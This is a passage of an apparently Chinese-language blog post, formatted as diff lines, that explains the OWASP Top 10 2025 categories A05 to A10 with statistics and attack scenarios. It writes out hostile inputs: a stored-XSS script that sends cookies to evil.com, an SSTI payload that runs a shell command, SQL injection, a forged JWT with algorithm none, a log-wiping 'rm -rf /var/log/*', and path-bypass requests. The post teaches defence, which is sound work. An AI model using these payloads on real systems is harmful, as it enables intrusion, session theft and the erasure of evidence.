+<h2 id="A05-2025-—-注入-Injection"><a href="#A05-2025-—-注入-Injection" class="headerlink" title="A05:2025 — 注入 (Injection)"></a>A05:2025 — 注入 (Injection)</h2><p><img src="/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Injection.png" srcset="/img/loading.gif" lazyload alt="A05 icon"></p>
+<h3 id="背景与数据-4"><a href="#背景与数据-4" class="headerlink" title="背景与数据"></a>背景与数据</h3><p>从 #3 下降至 #5，但不是因为注入漏洞变少了，而是因为现代框架（如 ORM、参数化查询默认开启）大幅减少了基本 SQL 注入的发生率。不过此类别映射了 <strong>38 个 CWE</strong>，依然是 CVE 关联最多的类别。</p>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>映射 CWE</td>
+<td>38 个</td>
+</tr>
+<tr>
+<td>最大发生率</td>
+<td>22.38%</td>
+</tr>
+<tr>
+<td>平均发生率</td>
+<td>3.39%</td>
+</tr>
+<tr>
+<td>平均加权 Exploit 评分</td>
+<td>6.87</td>
+</tr>
+<tr>
+<td>平均加权 Impact 评分</td>
+<td>3.67</td>
+</tr>
+<tr>
+<td>总发生次数</td>
+<td>415,251</td>
+</tr>
+<tr>
+<td>关联 CVE</td>
+<td>35,410</td>
+</tr>
+</tbody></table>
+<h3 id="主要包含什么-4"><a href="#主要包含什么-4" class="headerlink" title="主要包含什么"></a>主要包含什么</h3><ul>
+<li><strong>SQL 注入</strong>（CWE-89）：通过拼接用户输入构造恶意 SQL</li>
+<li><strong>NoSQL 注入</strong>：MongoDB、Redis 等非关系型数据库的注入</li>
+<li><strong>命令注入</strong>（CWE-77&#x2F;78）：用户输入被拼接到系统命令中执行</li>
+<li><strong>XSS 跨站脚本</strong>（CWE-79）：反射型、存储型、DOM 型</li>
+<li><strong>模板注入</strong>（SSTI）：服务端模板引擎执行用户输入的表达式</li>
+</ul>
+<h3 id="攻击场景（结合实战）"><a href="#攻击场景（结合实战）" class="headerlink" title="攻击场景（结合实战）"></a>攻击场景（结合实战）</h3><p><strong>场景 1：经典 SQL 注入</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/products?category=Gifts&#x27;+OR+1=1--</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 危险的字符串拼接</span><br><span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM products WHERE category = &#x27;&quot;</span> + request.getParameter(<span class="hljs-string">&quot;category&quot;</span>) + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> connection.createStatement();<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(query);<br></code></pre></td></tr></table></figure>
+
+<p><strong>场景 2：SSTI（服务端模板注入）</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Flask 应用中</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;World&#x27;</span>)<br>    template = <span class="hljs-string">f&quot;&lt;h1&gt;Hello <span class="hljs-subst">&#123;name&#125;</span>!&lt;/h1&gt;&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(template)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/hello?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;&#125;</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure>
+
+<p>正如之前在 <a target="_blank" rel="noopener" href="https://infernity.top/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/">2024 鹏城杯 python 口算题</a> 中遇到的场景，SSTI 往往能直接 RCE。</p>
+<p><strong>场景 3：XSS 存储型</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 评论框中输入后被直接渲染到页面 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://evil.com/steal?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="A06-2025-—-不安全设计-Insecure-Design"><a href="#A06-2025-—-不安全设计-Insecure-Design" class="headerlink" title="A06:2025 — 不安全设计 (Insecure Design)"></a>A06:2025 — 不安全设计 (Insecure Design)</h2><p><img src="/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Insecure_Design.png" srcset="/img/loading.gif" lazyload alt="A06 icon"></p>
+<h3 id="背景与数据-5"><a href="#背景与数据-5" class="headerlink" title="背景与数据"></a>背景与数据</h3><p>从 #4 下降至 #6，映射了 <strong>39 个 CWE</strong>。这是一个 <strong>无法通过自动化测试直接发现的类别</strong>——它涉及的是软件架构层面和设计层面的安全缺陷。</p>
+<blockquote>
+<p><strong>核心理念</strong>：一个安全的设计仍然可能存在实现上的缺陷。但一个不安全的设计，即使实现得再完美，也无法被修复。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>映射 CWE</td>
+<td>39 个</td>
+</tr>
+<tr>
+<td>最大发生率</td>
+<td>71.43%</td>
+</tr>
+<tr>
+<td>平均发生率</td>
+<td>2.95%</td>
+</tr>
+<tr>
+<td>最大覆盖率</td>
+<td>50.00%</td>
+</tr>
+<tr>
+<td>平均加权 Exploit 评分</td>
+<td>5.66</td>
+</tr>
+<tr>
+<td>平均加权 Impact 评分</td>
+<td>3.53</td>
+</tr>
+<tr>
+<td>总发生次数</td>
+<td>62,082</td>
+</tr>
+<tr>
+<td>关联 CVE</td>
+<td>13,085</td>
+</tr>
+</tbody></table>
+<h3 id="主要包含什么-5"><a href="#主要包含什么-5" class="headerlink" title="主要包含什么"></a>主要包含什么</h3><ul>
+<li><strong>缺乏威胁建模</strong>：在设计和架构阶段没有识别潜在威胁</li>
+<li><strong>安全需求缺失</strong>：功能需求中未纳入安全要求</li>
+<li><strong>默认不安全</strong>：系统默认配置开放所有功能，用户需要手动关闭</li>
+<li><strong>缺少速率限制</strong>：登录、API 调用未限制频率，放任暴力破解和 DDoS</li>
+</ul>
+<h3 id="攻击场景-4"><a href="#攻击场景-4" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：密码重置的”先改密码再验证”设计缺陷</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. 用户输入邮箱 → <span class="hljs-number">2</span>. 发送重置链接 → <span class="hljs-number">3</span>. 用户点击链接 → <span class="hljs-number">4</span>. 输入新密码<br></code></pre></td></tr></table></figure>
+
+<p>如果第 4 步不需要有效的重置 Token，攻击者可以直接调用 API 修改任何人密码。</p>
+<p><strong>场景 2：缺少速率限制</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/login</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-jboss-cli">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span>&#125;</span><br><span class="language-jboss-cli">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;password&quot;</span>&#125;</span><br><span class="language-jboss-cli">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;12345678&quot;</span>&#125;</span><br><span class="language-jboss-cli"><span class="hljs-string">...</span></span><br><span class="language-jboss-cli"><span class="hljs-comment"># 无次数限制，可以暴力尝试 100 万个密码</span></span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="A07-2025-—-身份认证失效-Authentication-Failures"><a href="#A07-2025-—-身份认证失效-Authentication-Failures" class="headerlink" title="A07:2025 — 身份认证失效 (Authentication Failures)"></a>A07:2025 — 身份认证失效 (Authentication Failures)</h2><p><img src="/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Authentication_Failures.png" srcset="/img/loading.gif" lazyload alt="A07 icon"></p>
+<h3 id="背景与数据-6"><a href="#背景与数据-6" class="headerlink" title="背景与数据"></a>背景与数据</h3><p>排名稳定在 #7。名称从 2021 版的 “Identification and Authentication Failures” 简化为 “Authentication Failures”。映射了 <strong>36 个 CWE</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>映射 CWE</td>
+<td>36 个</td>
+</tr>
+<tr>
+<td>最大发生率</td>
+<td>65.11%</td>
+</tr>
+<tr>
+<td>平均发生率</td>
+<td>3.25%</td>
+</tr>
+<tr>
+<td>平均加权 Exploit 评分</td>
+<td>6.21</td>
+</tr>
+<tr>
+<td>平均加权 Impact 评分</td>
+<td>3.86</td>
+</tr>
+<tr>
+<td>总发生次数</td>
+<td>87,967</td>
+</tr>
+<tr>
+<td>关联 CVE</td>
+<td>14,045</td>
+</tr>
+</tbody></table>
+<h3 id="主要包含什么-6"><a href="#主要包含什么-6" class="headerlink" title="主要包含什么"></a>主要包含什么</h3><ul>
+<li><strong>弱密码策略</strong>：允许 “123456”、”password” 等常见弱密码</li>
+<li><strong>凭据填充（Credential Stuffing）</strong>：利用已泄露的用户名密码组合批量尝试</li>
+<li><strong>缺少 MFA</strong>：没有多因素认证</li>
+<li><strong>会话管理缺陷</strong>：Token 过期时间过长、未在服务端失效</li>
+<li><strong>不安全的 JWT 处理</strong>：使用 <code>alg: none</code> 或弱签名密钥</li>
+<li><strong>账户枚举</strong>：登录失败时返回不同错误信息，可枚举有效用户名</li>
+</ul>
+<h3 id="攻击场景-5"><a href="#攻击场景-5" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：JWT <code>alg: none</code> 攻击</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br><span class="hljs-comment"># 攻击者将算法改为 &quot;none&quot;，绕过签名验证</span><br>token = jwt.encode(&#123;<span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;, key=<span class="hljs-string">&quot;&quot;</span>, algorithm=<span class="hljs-string">&quot;none&quot;</span>)<br><span class="hljs-comment"># 如果服务端未正确限制算法白名单，此 token 将被接受</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>场景 2：账户枚举</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/login</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-applescript">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;wrong&quot;</span>&#125;</span><br><span class="language-applescript"></span><br><span class="language-applescript"><span class="hljs-comment"># 响应： &quot;Password incorrect for user admin&quot;</span></span><br><span class="language-applescript"><span class="hljs-comment"># 攻击者可以确认 admin 用户存在</span></span><br></code></pre></td></tr></table></figure>
+
+<p>正确做法应该是返回通用的 “用户名或密码错误”。</p>
+<hr>
+<h2 id="A08-2025-—-软件和数据完整性失效-Software-Data-Integrity-Failures"><a href="#A08-2025-—-软件和数据完整性失效-Software-Data-Integrity-Failures" class="headerlink" title="A08:2025 — 软件和数据完整性失效 (Software &amp; Data Integrity Failures)"></a>A08:2025 — 软件和数据完整性失效 (Software &amp; Data Integrity Failures)</h2><p><img src="/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Software_Data_Integrity_Failures.png" srcset="/img/loading.gif" lazyload alt="A08 icon"></p>
+<h3 id="背景与数据-7"><a href="#背景与数据-7" class="headerlink" title="背景与数据"></a>背景与数据</h3><p>保持 #8 不变。映射了 <strong>14 个 CWE</strong>。此类别关注的是在运行时和交付时未能验证信任边界。</p>
+<blockquote>
+<p><strong>A03 vs A08 的区别</strong>：A03 关注的是”你依赖的东西本身是否安全”；A08 关注的是”你拿到的东西是否被篡改过”。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>映射 CWE</td>
+<td>14 个</td>
+</tr>
+<tr>
+<td>最大发生率</td>
+<td>2.33%</td>
+</tr>
+<tr>
+<td>平均发生率</td>
+<td>0.30%</td>
+</tr>
+<tr>
+<td>平均加权 Exploit 评分</td>
+<td>7.18</td>
+</tr>
+<tr>
+<td>平均加权 Impact 评分</td>
+<td>3.33</td>
+</tr>
+<tr>
+<td>总发生次数</td>
+<td>9,534</td>
+</tr>
+<tr>
+<td>关联 CVE</td>
+<td>3,483</td>
+</tr>
+</tbody></table>
+<h3 id="主要包含什么-7"><a href="#主要包含什么-7" class="headerlink" title="主要包含什么"></a>主要包含什么</h3><ul>
+<li><strong>不安全的反序列化</strong>（CWE-502）：Java&#x2F;PHP&#x2F;Python 原生反序列化、Hessian、Jackson 等</li>
+<li><strong>CI&#x2F;CD 流水线完整性缺失</strong>：构建产物在部署前没做完整性校验</li>
+<li><strong>未签名的更新机制</strong>：软件自动更新时未验证更新包的签名</li>
+<li><strong>第三方 CDN 脚本</strong>：从前端加载的 JS 库未使用 Subresource Integrity (SRI)</li>
+</ul>
+<h3 id="攻击场景（结合实战）-1"><a href="#攻击场景（结合实战）-1" class="headerlink" title="攻击场景（结合实战）"></a>攻击场景（结合实战）</h3><p><strong>场景 1：Java 原生反序列化</strong></p>
+<p>这其实就是我最常写的领域。正如 <a target="_blank" rel="noopener" href="https://infernity.top/2025/03/13/C3P0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C3P0 反序列化</a>、<a target="_blank" rel="noopener" href="https://infernity.top/2025/03/03/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Hessian 反序列化</a>、<a target="_blank" rel="noopener" href="https://infernity.top/categories/JAVA/">CC 链系列</a> 中所分析的，一条完整的反序列化利用链通常包含多个组件协同工作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 攻击者构造恶意的序列化 payload</span><br><span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(maliciousBytes);<br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>ois.readObject();  <span class="hljs-comment">// 触发链子，执行任意代码</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>场景 2：未签名的软件更新</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 更新程序只是简单地从 HTTP 下载并替换文件</span><br>wget http:<span class="hljs-regexp">//u</span>pdates.example.com<span class="hljs-regexp">/app-latest.bin -O /</span>opt<span class="hljs-regexp">/app/</span>bin/app<br><span class="hljs-comment"># 如果攻击者控制了 updates.example.com 的 DNS 或进行 MITM，</span><br><span class="hljs-comment"># 就可以植入后门版本</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="A09-2025-—-日志和告警失效-Logging-Alerting-Failures"><a href="#A09-2025-—-日志和告警失效-Logging-Alerting-Failures" class="headerlink" title="A09:2025 — 日志和告警失效 (Logging &amp; Alerting Failures)"></a>A09:2025 — 日志和告警失效 (Logging &amp; Alerting Failures)</h2><p><img src="/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Logging_Alerting_Failures.png" srcset="/img/loading.gif" lazyload alt="A09 icon"></p>
+<h3 id="背景与数据-8"><a href="#背景与数据-8" class="headerlink" title="背景与数据"></a>背景与数据</h3><p>排名不变（#9），但名称从 “Security Logging and Monitoring Failures” 更名为 “Logging &amp; Alerting Failures”，强调了<strong>告警</strong>的重要性。仅映射了 <strong>5 个 CWE</strong>，是 CWE 数量最少的类别之一。</p>
+<blockquote>
+<p><strong>核心观点</strong>：写得再好再全的日志，如果没有对应的告警机制，那也基本等于没写。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>映射 CWE</td>
+<td>5 个</td>
+</tr>
+<tr>
+<td>最大发生率</td>
+<td>47.06%</td>
+</tr>
+<tr>
+<td>平均发生率</td>
+<td>0.53%</td>
+</tr>
+<tr>
+<td>最大覆盖率</td>
+<td>5.26%</td>
+</tr>
+<tr>
+<td>平均加权 Exploit 评分</td>
+<td>5.20</td>
+</tr>
+<tr>
+<td>平均加权 Impact 评分</td>
+<td>3.63</td>
+</tr>
+<tr>
+<td>总发生次数</td>
+<td>5,152</td>
+</tr>
+<tr>
+<td>关联 CVE</td>
+<td>295</td>
+</tr>
+</tbody></table>
+<h3 id="主要包含什么-8"><a href="#主要包含什么-8" class="headerlink" title="主要包含什么"></a>主要包含什么</h3><ul>
+<li>安全相关事件无日志记录（登录失败、权限提升、敏感操作）</li>
+<li>日志记录的格式不统一，无法进行关联分析</li>
+<li>日志内容不完整，缺少时间戳、来源 IP、用户标识等关键信息</li>
+<li>有日志但没有告警规则，攻击发生后数周甚至数月才被发现</li>
+<li>日志存储不安全，可被攻击者删除或篡改</li>
+<li>日志处理存在注入漏洞（如 Log4Shell 就是日志注入导致的 RCE）</li>
+</ul>
+<h3 id="攻击场景-6"><a href="#攻击场景-6" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：日志被删除</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 攻击者在 <span class="hljs-keyword">SQL</span> 注入获取数据后<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> audit_logs <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">&#x27;attacker&#x27;</span>;<br># 或者直接清空系统日志<br>rm -rf /var/<span class="hljs-keyword">log</span><span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure>
+
+<p>如果日志仅存在本地且没有实时转发到集中日志平台，被清理后就永远无法溯源。</p>
+<p><strong>场景 2：有日志无告警</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">2026-07-08 03:14:22 [WARN] Failed login attempt <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">from</span> 45.33.32.156<br>2026-07-08 03:14:23 [WARN] Failed login attempt <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">from</span> 45.33.32.156<br>2026-07-08 03:14:24 [WARN] Failed login attempt <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">from</span> 45.33.32.156<br><span class="hljs-built_in">..</span>. (10,000 more lines) <span class="hljs-built_in">..</span>.<br>2026-07-08 04:02:15 [<span class="hljs-built_in">INFO</span>]<span class="hljs-built_in"> User </span><span class="hljs-string">&#x27;admin&#x27;</span> logged <span class="hljs-keyword">in</span> successfully <span class="hljs-keyword">from</span> 45.33.32.156<br></code></pre></td></tr></table></figure>
+
+<p>每分钟 3000 次失败登录后突然成功——如果没告警，管理员可能要等到发现数据泄露才知道。</p>
+<hr>
+<h2 id="A10-2025-—-异常条件处理不当-Mishandling-of-Exceptional-Conditions-🆕"><a href="#A10-2025-—-异常条件处理不当-Mishandling-of-Exceptional-Conditions-🆕" class="headerlink" title="A10:2025 — 异常条件处理不当 (Mishandling of Exceptional Conditions) 🆕"></a>A10:2025 — 异常条件处理不当 (Mishandling of Exceptional Conditions) 🆕</h2><p><img src="/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Mishandling_Exceptional_Conditions.png" srcset="/img/loading.gif" lazyload alt="A10 icon"></p>
+<h3 id="背景与数据-9"><a href="#背景与数据-9" class="headerlink" title="背景与数据"></a>背景与数据</h3><p>2025 版全新上榜类别。映射了 <strong>24 个 CWE</strong>。前几届一直徘徊在 Top 10 边缘，这次终于凭借足够的数据量和社区调查支持成功入榜。</p>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>映射 CWE</td>
+<td>24 个</td>
+</tr>
+<tr>
+<td>最大发生率</td>
+<td>23.32%</td>
+</tr>
+<tr>
+<td>平均发生率</td>
+<td>2.25%</td>
+</tr>
+<tr>
+<td>最大覆盖率</td>
+<td>100.00%</td>
+</tr>
+<tr>
+<td>平均加权 Exploit 评分</td>
+<td>8.23（第二高）</td>
+</tr>
+<tr>
+<td>平均加权 Impact 评分</td>
+<td>3.64</td>
+</tr>
+<tr>
+<td>总发生次数</td>
+<td>207,260</td>
+</tr>
+<tr>
+<td>关联 CVE</td>
+<td>6,426</td>
+</tr>
+</tbody></table>
+<h3 id="主要包含什么-9"><a href="#主要包含什么-9" class="headerlink" title="主要包含什么"></a>主要包含什么</h3><ul>
+<li><strong>“Fail Open” 设计缺陷</strong>：系统在异常情况下默认放行，而非拒绝</li>
+<li><strong>未捕获的异常</strong>：代码中未处理异常导致程序崩溃或暴露内部状态</li>
+<li><strong>安全检查在异常路径被绕过</strong>：<code>try-catch</code> 中的安全控制逻辑在异常时被跳过</li>
+<li><strong>竞态条件（Race Condition）</strong>：TOCTOU（Time-of-Check Time-of-Use）问题</li>
+<li><strong>错误消息泄露敏感信息</strong>：系统出错时暴露数据库结构、代码路径、堆栈跟踪</li>
+</ul>
+<h3 id="攻击场景-7"><a href="#攻击场景-7" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：Fail Open 认证绕过</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 危险：异常情况下认证被跳过</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">authenticate</span><span class="hljs-params">(String token)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> thirdPartyAuthService.verify(token);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(<span class="hljs-string">&quot;Auth service error: &quot;</span> + e.getMessage());<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 错误！Fail Open！认证服务挂了就放行！</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>如果第三方认证服务暂时不可用，系统直接认为所有用户都通过了认证。</p>
+<p><strong>场景 2：TOCTOU 竞态条件</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 先检查再使用，存在时间窗口</span><br><span class="hljs-keyword">if</span> os.path.exists(filename) <span class="hljs-keyword">and</span> user_has_permission(filename):<br>    <span class="hljs-comment"># &lt;- 攻击者在此刻替换了文件（符号链接攻击）</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        content = f.read()<br></code></pre></td></tr></table></figure>
+
+<p><strong>场景 3：Nginx 反向代理路径绕过</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx 配置了路径限制</span><br><span class="hljs-section">location</span> /admin/ &#123;<br>    <span class="hljs-attribute">deny</span> all;<br>&#125;<br><br><span class="hljs-section">location</span> / &#123;<br>    <span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">GET /Admin/secret HTTP/1.1    # 大小写绕过<br>GET /admin;/secret HTTP/1.1   # 特殊字符绕过  <br>GET /admin/../secret HTTP/1.1 # 路径穿越绕过<br></code></pre></td></tr></table></figure>
+
+<p>这让我想起之前做过的很多渗透测试，Nginx&#x2F;Apache 与后端应用对 URL 解析不一致导致权限绕过，实在太常见了。</p>
+<hr>
+<h2 id="2025-版核心方法论变化"><a href="#2025-版核心方法论变化" class="headerlink" title="2025 版核心方法论变化"></a>2025 版核心方法论变化</h2><h3 id="从”症状”到”根本原因”"><a href="#从”症状”到”根本原因”" class="headerlink" title="从”症状”到”根本原因”"></a>从”症状”到”根本原因”</h3><p>OWASP Top 10 2025 继续深化了从”症状型分类”向”根本原因型分类”的转变。举个例子：</p>
+<table>
+<thead>
+<tr>
+<th>症状型思维（老版本）</th>
+<th>根本原因型思维（2025 版）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>“敏感数据暴露”</td>
+<td>看数据为什么暴露——加密问题归 A04，配置问题归 A02，访问控制问题归 A01</td>
+</tr>
+<tr>
+<td>“XXE”</td>
+<td>实体解析本质上是一种配置问题，归入 A02 安全配置错误</td>
+</tr>
+<tr>
+<td>“SSRF”</td>
+<td>本质上是未对服务端请求目标做访问控制，归入 A01 访问控制失效</td>
+</tr>
+</tbody></table>
+<p>这种分类方式的优势在于：<strong>对症的诊断更准确，防护建议更有针对性</strong>。</p>
+<h3 id="为什么是”类别”而不是一个-CWE-列表？"><a href="#为什么是”类别”而不是一个-CWE-列表？" class="headerlink" title="为什么是”类别”而不是一个 CWE 列表？"></a>为什么是”类别”而不是一个 CWE 列表？</h3><p>OWASP 收到了很多建议，能不能直接出一个 “Top 10 CWE” 列表？答案是不能：</p>
+<ol>
+<li><strong>不是所有 CWE 都适用于所有语言&#x2F;框架</strong>。CWE-89（SQL 注入）在纯前端应用中就不相关。</li>
+<li><strong>同一种漏洞在不同上下文中被映射为不同 CWE</strong>。比如注入就有 SQL 注入、命令注入、XSS 等不同的 CWE。用类别可以一并覆盖。</li>
+</ol>
+<p>2025 版总共包含了 <strong>248 个 CWE</strong> 分布在 10 个类别中。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>OWASP Top 10 2025 相比 2021 版的核心变化趋势非常明显：</p>
+<ol>
